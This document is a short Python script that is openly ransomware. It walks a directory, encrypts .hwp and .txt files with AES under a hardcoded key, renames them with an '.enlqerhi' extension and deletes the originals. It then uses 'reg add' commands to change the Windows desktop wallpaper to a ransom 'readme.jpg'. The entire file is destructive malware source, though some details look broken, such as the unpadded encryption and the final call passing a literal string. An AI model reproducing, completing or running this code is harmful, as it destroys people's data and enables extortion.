import os
from Crypto.Cipher import AES
import hashlib

class AESCipher(object):
    def __init__(self, key, iv):
        self.key = hashlib.sha256(key.encode()).digest()
        self.iv = hashlib.md5(iv.encode()).digest()

    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        enc = cipher.encrypt(data)
        return enc

def Encoding(full_filename):
    Hash = '0ebdb7f9b238c2fd40f922099b7d65f24ffa3f084deccf0ea40f658e09b2a1ec'
    iv = 'enlqerhi'
    aes = AESCipher(Hash, iv)

    file_old = open(full_filename, 'rb')
    data = file_old.read()

    encrypt = aes.encrypt(data)

    file_new = open(full_filename + '.enlqerhi', 'wb')
    file_new.write(encrypt)

    file_old.close()
    file_new.close()

    os.remove(full_filename)

def Target(Extension):
    if Extension in ['.hwp', '.txt']: #Enter infection target(extension)
        return True
    else:
        return False

def Search(dirname):
    for (path, dir, files) in os.walk(dirname):
        for filename in files:
            full_filename = os.path.join(path, filename)
            Extension = os.path.splitext(filename)[-1]
            if Target(Extension) == True:
                Encoding(full_filename)

desktopPath = os.path.expanduser('~')
filepath = '"' + desktopPath + '\\desktop\\readme.jpg" /f'
reg_key_1 = 'reg add "hkcu\control panel\desktop" /v wallpaper /t REG_SZ /d ' + filepath
reg_key_2 = 'reg add "hkcu\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 0 /f'


os.system(reg_key_1)
os.system(reg_key_2)
os.system("RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters ,1 ,True")

target_local = desktopPath + '\\desktop'
Search('target_local')
